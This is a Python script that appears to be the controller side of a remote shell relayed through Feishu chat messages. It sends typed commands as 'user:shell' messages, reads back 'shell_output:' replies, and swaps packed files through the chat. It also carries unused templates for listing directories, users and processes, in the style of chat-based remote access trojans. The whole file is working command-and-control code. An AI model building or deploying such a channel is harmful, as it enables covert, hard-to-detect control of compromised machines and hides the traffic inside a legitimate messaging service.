import requests
import json
from uuid import uuid4
import time
from requests_toolbelt import MultipartEncoder
import os
import hashlib
import sys
import io

ADMIN = os.environ.get("ADMIN") or []

headers = {
    "Authorization": f"Bearer {os.environ.get('FEISHU_ACCESS_TOKEN')}",
    "Content-Type": "application/json",
}


def get_file_hash(filepath):
    """Calculate MD5 hash of file if it exists"""
    if not os.path.exists(filepath):
        return None
    with open(filepath, "rb") as f:
        return hashlib.md5(f.read()).hexdigest()


def sync_files(server_info):
    """Sync files between server and client"""
    in_file = os.path.join(server_info["tmp_dir"], "in.pack")

    # Check if last_out_hash exists in server_info
    if "last_out_hash" not in server_info:
        server_info["last_out_hash"] = None

    # Get current hash of out.pack
    current_out_hash = get_file_hash(in_file)

    # If out.pack changed, send it
    if current_out_hash and current_out_hash != server_info["last_out_hash"]:
        send_file(server_info, in_file)
        server_info["last_out_hash"] = current_out_hash

def save_file(server_info, message_id, file_key, file_name):
    url = f"https://open.feishu.cn/open-apis/im/v1/messages/{message_id}/resources/{file_key}?type=file"
    response = requests.request("GET", url, headers=server_info["headers"], data="").content
    
    with open(os.path.join(server_info["tmp_dir"], file_name), "wb") as f:
        f.write(response)

def get_messages(server_info):
    url = f"https://open.feishu.cn/open-apis/im/v1/messages?container_id={server_info['chat_id']}&container_id_type=chat&page_size=20&sort_type=ByCreateTimeDesc"
    response = requests.request("GET", url, headers=server_info["headers"], data="").json()

    have_new_data = False

    for item in response["data"]["items"]:
        if server_info.get(
            "last_message_time", 0
        ) >= int(item["create_time"]):
            continue

        if item["sender"]["sender_type"] == "app":
            item_data = json.loads(item["body"]["content"])
            if not have_new_data and item_data.get("file_name", "") == "out.pack":
                have_new_data = True
                if item_data["file_key"] not in server_info["done_file_key"]:
                    save_file(server_info, item["message_id"], item_data["file_key"], item_data["file_name"])
                    server_info["done_file_key"].append(item_data["file_key"])

            if item["msg_type"] == "text" and item_data["text"].startswith("shell_output:"):
                yield item_data["text"][len("shell_output:"):]
        # else:


def send_file(server_info, file_path):

    url = "https://open.feishu.cn/open-apis/im/v1/files"

    payload = {"file_type": "stream", "file_name": os.path.basename(file_path)}
    files = {
        "file": (
            os.path.basename(file_path),
            open(file_path, "rb"),
            "application/octet-stream",
        )
    }

    form = {
        "file_name": os.path.basename(file_path),
        "file_type": "stream",
        "file": (io.BytesIO(open(file_path, "rb").read())),
    }

    multi_form = MultipartEncoder(form)
    headers = server_info["headers"]
    headers["Content-Type"] = multi_form.content_type

    response = requests.request(
        "POST", url, headers=headers, data=multi_form
    ).json()

    print(response)

    file_key = response["data"]["file_key"]

    url = "https://open.feishu.cn/open-apis/im/v1/messages?receive_id_type=chat_id"
    payload = json.dumps(
        {
            "content": json.dumps({"file_key": file_key}),
            "msg_type": "file",
            "receive_id": server_info["chat_id"],
            "uuid": str(uuid4()),
        }
    )

    response = requests.request(
        "POST", url, headers=server_info["headers"], data=payload
    )


def create_session(server_info):

    server_info["chat_id"] = sys.argv[1]
    # server_info["tmp_dir"] = "./" + server_info["chat_id"]
    server_info["tmp_dir"] = "/tmp/chat/"
    os.makedirs(server_info["tmp_dir"], exist_ok=True)

    return server_info["chat_id"]


def change_tmp_dir(server_info, tmp_dir):
    server_info["tmp_dir"] = tmp_dir
    os.makedirs(tmp_dir, exist_ok=True)

def send_text(server_info, text):

    url = "https://open.feishu.cn/open-apis/im/v1/messages?receive_id_type=chat_id"
    payload = json.dumps(
        {
            "content": json.dumps({"text": text}),
            "msg_type": "text",
            "receive_id": server_info["chat_id"],
            "uuid": str(uuid4()),
        }
    )

    response = requests.request(
        "POST", url, headers=server_info["headers"], data=payload
    )

DIR_HTML = "<b>Directory Listing</b>\n<i>Dir: {}</i>\n<b>Items:</b>\n\n"
USR_HTML = "<b>Active Users Listing</b>\n<b>Users:</b>\n\n"
PCS_HTML = "<b>Running Processes Listing</b>\n<b>Processes:</b>\n\n"
WRT_HTML = "<b>Write Status: </b>"
OPT_HTML = "<b>Output: </b>\n\n"


def update_server_info(server_info):
    url = "https://open.feishu.cn/open-apis/auth/v3/tenant_access_token/internal"

    response = requests.request(
        "POST", url, json=server_info["app_info"]
    ).json()
    server_info["headers"]["Authorization"] = "Bearer " + response["tenant_access_token"]

server_info = {
    "last_message_time": 0,
    "sleep_time": 0.5,
    "done_file_key": [],
    "app_info": {
        "app_id": os.environ.get("FEISHU_APP_ID"),
        "app_secret": os.environ.get("FEISHU_APP_SECRET"),
    },
    "headers": {
        "Content-Type": "application/json",
    },
}


# Main runtime - loop until terminate message is obtained
if __name__ == "__main__":

    update_server_info(server_info)
    chat_id = create_session(server_info)
    print(server_info)
    # while True:
    #     print(get_messages(server_info))
    # delete_session(server_info)
    end = False
    first_run = True
    while not end:
        try:
            update_id = -1

            if len(sys.argv) >= 3 and sys.argv[2] == "shell":
                for _ in range(10):
                    msg = None
                    for msg in get_messages(server_info):
                        if not first_run:
                            print(msg)
                        break
                    if msg or first_run:
                        break
                    time.sleep(1)

                send_text(server_info, "user:shell " + input(">>>"))
                first_run = False
            else:
                for msg in get_messages(server_info):
                    pass
                sync_files(server_info)
                if not end:
                    time.sleep(server_info["sleep_time"])
        except Exception as e:
            print(e)
            update_server_info(server_info)

    # delete_session(server_info)


# print(chat_id)
